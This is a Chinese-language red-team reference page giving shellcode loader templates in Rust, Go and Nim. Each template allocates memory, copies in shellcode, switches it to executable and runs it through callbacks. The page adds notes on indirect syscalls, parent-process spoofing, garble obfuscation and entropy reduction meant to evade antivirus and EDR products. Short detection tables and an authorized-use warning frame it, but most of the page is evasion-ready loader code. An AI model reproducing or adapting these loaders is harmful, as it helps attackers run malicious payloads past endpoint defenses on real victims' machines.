# Rust / Go / Nim 加载器模板（P1-17）

> 本文件补齐审计 **P1-17（Rust/Go/Nim 加载器模板）**：三个语言各一份可编译加载器模板。
> 覆盖 **原理 → 实现 → 检测侧 → 实测判据**。
> 授权立场见 `refs/README.md`；交叉引用 `loader-engineering.md`（C/Rust 基础）与 `packer/`（Go SyscallN）。

## 0. 语言选型

| 语言 | 优势 | 劣势 | 典型用途 |
|---|---|---|---|
| Rust | 内存安全、交叉编译、小体积、间接 syscall 生态（acheron/RustSL-Syscall） | 编译慢、上手陡 | 高级加载器 |
| Go | 快速开发、内置网络、交叉编译简单 | 体积大、GC 特征、runtime 特征 | 快速工具/加载器 |
| Nim | 跨平台、元编程、AV 规避友好（小众） | 生态小 | 规避型加载器 |

---

## 1. Rust 加载器（间接 syscall + threadless + PPID spoof）

```rust
// 骨架示例：Rust 间接 syscall + 内存执行（参考 echQoQ/RustSL-Syscall 思路）
// Cargo.toml 依赖: windows-sys / ntapi（或手写 extern "system"）
use std::ffi::c_void;

// 1) 直接/间接 syscall：NtAllocateVirtualMemory + NtProtectVirtualMemory
//    （用 RustSL-Syscall / acheron 生成间接 syscall stub，返回地址指向 ntdll）
// 2) 内存执行：RW 写 shellcode -> RX -> 回调/fiber/threadless 执行
// 3) PPID spoof：CreateProcess + EXTENDED_STARTUPINFO_PRESENT + PROC_THREAD_ATTRIBUTE_PARENT_PROCESS

// 编译（体积/特征消减）：
// [profile.release] opt-level="z" lto=true codegen-units=1 panic="abort" strip=true
```

```rust
// 骨架示例：RW -> RX 分离执行（避免 RWX）
fn exec(shellcode: &[u8]) {
    unsafe {
        use std::ffi::c_void;
        extern "system" {
            fn VirtualAlloc(a: *mut c_void, s: usize, t: u32, p: u32) -> *mut c_void;
            fn VirtualProtect(a: *mut c_void, s: usize, p: u32, o: *mut u32) -> i32;
        }
        let mem = VirtualAlloc(std::ptr::null_mut(), shellcode.len(), 0x3000, 0x04); // RW
        std::ptr::copy_nonoverlapping(shellcode.as_ptr(), mem as *mut u8, shellcode.len());
        let mut old = 0u32;
        VirtualProtect(mem, shellcode.len(), 0x20, &mut old);                          // RX
        let f: fn() = std::mem::transmute(mem);
        f();
    }
}
```

**检测侧**：RX 转换 + 匿名执行；Rust 无 runtime 特征但二进制节区/导入表可被静态分析。

---

## 2. Go 加载器（SyscallN + garble）

```go
// 骨架示例：Go 加载器（间接 syscall + 熵值消减）
package main

import (
    "golang.org/x/sys/windows"
    "unsafe"
)

// 1) 直接 syscall：NtAllocateVirtualMemory（绕过 kernel32 hook）
// 2) 内存执行：RW -> RX -> 回调
func exec(shellcode []byte) error {
    addr, err := windows.VirtualAlloc(0, uintptr(len(shellcode)),
        windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
    if err != nil { return err }
    // 拷贝 shellcode
    copy((*[1 << 30]byte)(unsafe.Pointer(addr))[:len(shellcode)], shellcode)
    var old uint32
    windows.VirtualProtect(addr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, &old)
    // 回调执行（规避 CreateThread）
    _ = windows.CertEnumSystemStore(windows.CERT_SYSTEM_STORE_CURRENT_USER, nil, nil,
        (*windows.CertEnumSystemStoreCallback)(unsafe.Pointer(addr)))
    return nil
}

// 熵值消减（garble 之外）：
// 1) 加正常文本/图标资源稀释熵
// 2) -ldflags="-s -w -trimpath" 去符号
// 3) garble -litter build 混淆
```

**检测侧**：Go runtime 特征（`go.buildid`、runtime 符号、GC）；EDR 对 Go 二进制的静态启发。

---

## 3. Nim 加载器

```nim
# 骨架示例：Nim 加载器（Winim / 直接 WinAPI）
import winim/lean

proc exec(shellcode: ptr byte, len: int) =
    var mem = VirtualAlloc(nil, cast[SIZE_T](len),
        MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
    copyMem(mem, shellcode, len)
    var old: DWORD
    VirtualProtect(mem, cast[SIZE_T](len), PAGE_EXECUTE_READ, addr old)
    # 回调执行
    discard EnumWindows(cast[WNDENUMPROC](mem), 0)

# 编译（体积/特征消减）：
# nim c -d:release --opt:size --passC:"-s" loader.nim
# 或 -d:mingw 交叉编译到 Windows
```

**检测侧**：Nim 编译产物（小体积、精简导入表）；AV 对 Nim 的启发式弱于 C/Go（小众语言优势）。

---

## 4. 检测侧总表（回馈 attack-defense）

| 语言 | 检测点 | 判据 |
|---|---|---|
| Rust | 无 runtime + RX 转换 | 静态节区 + 内存保护轨迹 |
| Go | runtime 特征 + 熵 | go.buildid + 高熵/低熵 |
| Nim | 精简导入 + 小体积 | PE 静态特征 |

## 5. 实测判据

| 判据 | 方法 |
|---|---|
| 体积/特征是否消减 | `strings` + `size` + YARA 扫描 |
| 内存执行是否隐蔽 | RW->RX 轨迹 + 无 RWX |
| 是否被静态识别 | AV/EDR 静态扫描命中率 |

*WARNING: 授权红队评估与安全研究专用。*
